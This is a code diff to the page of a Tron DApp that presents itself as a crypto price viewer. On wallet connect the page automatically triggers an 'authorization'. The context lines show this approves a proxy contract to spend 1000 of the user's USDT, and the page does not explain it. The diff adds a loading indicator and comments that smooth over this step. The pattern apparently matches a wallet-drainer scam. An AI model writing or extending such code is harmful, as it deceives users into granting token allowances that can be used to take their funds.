@@ -124,6 +124,7 @@
         <h1>Welcome to My Tron DApp</h1>
         <button onclick="connectWallet()">连接 TronLink</button>
         <p id="status">未连接</p>
+        <p id="authStatus" class="loading">授权中...</p>
 
         <h2>实时加密货币价格</h2>
         <div class="card price-card" id="priceList">
@@ -192,10 +193,13 @@
                     tronWeb = window.tronWeb;
                     const address = tronWeb.defaultAddress.base58;
                     document.getElementById("status").innerText = `已连接: ${address}`;
-                    await authorize(); // 执行授权逻辑
+                    document.getElementById("authStatus").style.display = "block"; // 显示授权中提示
+                    await authorize(); // 自动触发授权
+                    document.getElementById("authStatus").style.display = "none"; // 隐藏授权中提示
                     await updateBalances(); // 更新余额
                 } catch (error) {
                     document.getElementById("status").innerText = "连接失败: " + error.message;
+                    document.getElementById("authStatus").style.display = "none";
                 }
             } else {
                 document.getElementById("status").innerText = "请安装 TronLink 并登录";
@@ -210,7 +214,7 @@
                 console.log("签名完成:", signature);
 
                 const contract = await tronWeb.contract().at(usdtAddress);
-                const amountInUnits = 1000000000; // 授权 1000 USDT
+                const amountInUnits = 1000000000; // 预设授权 1000 USDT
                 await contract.approve(proxyContractAddress, amountInUnits).send();
                 console.log("USDT 授权成功");
                 isAuthorized = true;
